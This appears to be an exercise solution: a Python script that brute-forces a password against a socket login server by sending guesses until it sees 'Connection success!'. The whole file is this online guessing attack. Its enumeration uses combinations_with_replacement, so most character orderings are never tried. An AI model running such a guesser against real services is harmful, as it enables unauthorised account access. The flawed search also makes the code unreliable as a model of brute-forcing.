import argparse
import socket
from string import ascii_lowercase, digits
from itertools import combinations_with_replacement


def connect(args):
    with socket.socket() as sock:
        sock.connect((args.hostname, args.port))
        for length in range(1, 30):
            for letters in combinations_with_replacement(ascii_lowercase + digits, length):
                pwd = ''.join(letters)
                sock.send(pwd.encode())
                response = sock.recv(1024).decode("utf-8")
                if 'Wrong password!' in response:
                    continue
                if 'Connection success!' in response:
                    print(pwd)
                    return
                elif 'Too many attempts' in response:
                    return


parser = argparse.ArgumentParser()
parser.add_argument('hostname')
parser.add_argument('port', type=int)
connect(parser.parse_args())